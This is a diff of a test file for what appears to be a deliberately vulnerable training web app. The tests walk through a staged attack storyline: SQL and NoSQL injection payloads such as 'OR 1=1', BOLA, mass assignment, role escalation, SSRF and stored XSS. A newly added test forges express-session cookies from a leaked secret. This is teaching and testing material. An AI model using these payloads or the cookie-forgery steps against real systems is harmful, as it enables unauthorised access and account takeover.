@@ -34,7 +34,7 @@ after(async () => {
  * exactly as STORYLINE.md describes. Sequential, like the storyline itself.
  */
 
-test('Act 0 · Recon — apidoc, /status, /debug, /api/v0 leak as documented (API9/CFG-3/CFG-4/BAC-6)', async () => {
+test('Act 0 · Case the campus — apidoc, /status, /debug, /api/v0 leak as documented (API9/CFG-3/CFG-4/BAC-6)', async () => {
   const c = makeClient(base);
 
   const apidoc = await c.rootGet('/apidoc/');
@@ -55,7 +55,7 @@ test('Act 0 · Recon — apidoc, /status, /debug, /api/v0 leak as documented (AP
   assert.ok(legacy.json.data.api_key, 'BAC-6/BOP-2: legacy record exposes the api_key');
 });
 
-test('Act 1 · Foothold — injection auth-bypass and the parameterised contrast (INJ-1 / safe)', async () => {
+test('Act 1 · Get a foothold — injection auth-bypass and the parameterised contrast (INJ-1 / safe)', async () => {
   // Normal login works.
   const c = makeClient(base);
   const ok = await c.post('/students/login', { username: 'student1', password: 'student1' });
@@ -79,7 +79,7 @@ test('Act 1 · Foothold — injection auth-bypass and the parameterised contrast
   assert.ok(app.getLog().includes("OR '1'='1'"), 'LOG-1: injected input reached the logs verbatim');
 });
 
-test('Act 2 · Peers — BOLA over student records and transcripts (BAC-1 / BAC-2 / BOP-2)', async () => {
+test('Act 2 · Read the class — BOLA over student records and transcripts (BAC-1 / BAC-2 / BOP-2)', async () => {
   const c = makeClient(base);
   await c.post('/students/login', { username: 'student1', password: 'student1' });
 
@@ -97,7 +97,7 @@ test('Act 2 · Peers — BOLA over student records and transcripts (BAC-1 / BAC-
   assert.ok(tr.json.data.every((r) => r.student_id === 2));
 });
 
-test('Act 3 · Promotion — mass assignment elevates role (BOP-1)', async () => {
+test('Act 3 · Change who you are — mass assignment elevates role (BOP-1)', async () => {
   const c = makeClient(base);
   await c.post('/students/login', { username: 'student1', password: 'student1' });
 
@@ -110,7 +110,7 @@ test('Act 3 · Promotion — mass assignment elevates role (BOP-1)', async () =>
   assert.equal(patched.json.data.gpa, 4, 'BOP-1: gpa mass-assigned');
 });
 
-test('Act 4 · Faculty powers — BFLA grade change works for a plain student (BAC-3)', async () => {
+test('Act 4 · Rewrite the record — BFLA grade change works for a plain student (BAC-3)', async () => {
   // Fresh student session (role student) — proves no function-level authz.
   const c = makeClient(base);
   await c.post('/students/login', { username: 'student2', password: 'student2' });
@@ -123,7 +123,7 @@ test('Act 4 · Faculty powers — BFLA grade change works for a plain student (B
   assert.equal(graded.json.data.grade, 'A+', 'grade was written');
 });
 
-test('Act 5 · Campus core — NoSQL injection, token forgery, BFLA roster (INJ-6 / CRY-4 / BAC-5)', async () => {
+test('Act 5 · Breach campus security — NoSQL injection, token forgery, BFLA roster (INJ-6 / CRY-4 / BAC-5)', async () => {
   const c = makeClient(base);
 
   // INJ-6: NoSQL operator injection returns a superadmin without credentials.
@@ -147,7 +147,7 @@ test('Act 5 · Campus core — NoSQL injection, token forgery, BFLA roster (INJ-
   assert.ok(roster.json.data.some((u) => u.password), 'BOP-2: roster exposes password hashes');
 });
 
-test('Act 6 · Takeover — SSRF, unsafe upstream consumption, upload integrity, stored XSS (SSR-1 / UAP-1 / INT-1 / XSS-1)', async () => {
+test('Act 6 · Reach inside & go quiet — SSRF, unsafe upstream consumption, upload integrity, stored XSS (SSR-1 / UAP-1 / INT-1 / XSS-1)', async () => {
   const c = makeClient(base);
   await c.post('/students/login', { username: 'student1', password: 'student1' });
 
@@ -234,6 +234,38 @@ test('INJ-5 · PostgreSQL registrar transcript injection returns every transcrip
   const inj = await c.get('/registrar/transcript/' + encodeURIComponent('1 OR 1=1'));
   assert.equal(inj.json.result, 'success');
   assert.ok(inj.json.data.length > baseline, 'INJ-5: injection returns transcripts beyond student 1');
+});
+
+test('CRY-3 · the session secret leaked by /status signs valid session cookies', async () => {
+  // Log in and read the signed session cookie (express-session: "s:<sid>.<hmac>").
+  const res = await fetch(`${base}/api/v1/students/login`, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ username: 'student1', password: 'student1' }),
+  });
+  const [name, value] = res.headers.getSetCookie()[0].split(';')[0].split('=');
+  const signed = decodeURIComponent(value);
+  const sid = signed.slice(2, signed.lastIndexOf('.'));
+
+  // Re-sign the session id with the secret that /status discloses (CFG-3).
+  const status = await makeClient(base).rootGet('/status');
+  const secret = status.json.data.config.sessionSecret;
+  const hmac = crypto.createHmac('sha256', secret).update(sid).digest('base64').replace(/=+$/, '');
+  assert.equal(`s:${sid}.${hmac}`, signed, 'CRY-3: the leaked secret reproduces the server signature');
+
+  // A cookie signed only with the leaked secret is accepted as the session.
+  const me = await fetch(`${base}/api/v1/me`, { headers: { cookie: `${name}=${encodeURIComponent(`s:${sid}.${hmac}`)}` } });
+  assert.equal(me.status, 200, 'CRY-3: a self-signed session cookie is accepted');
+});
+
+test('DSN-1 · privileged registrar flows have no business-rule guardrails', async () => {
+  const c = await loginStudent('student2', 'student2');
+  const graded = await c.post('/registrar/grade', { transcriptId: 2, grade: 'Z-' });
+  assert.equal(graded.json.result, 'success', 'DSN-1: a grade outside any grading scale is accepted');
+  assert.equal(graded.json.data.grade, 'Z-');
+
+  const enrolled = await c.post('/registrar/enroll', { studentId: 2, course: 'NOT-A-COURSE', term: '1850-SPRING' });
+  assert.equal(enrolled.json.result, 'success', 'DSN-1: enrollment into an unknown course and past term is accepted');
 });
 
 test('BAC-4 · a plain student can enroll any student id (BFLA / horizontal)', async () => {
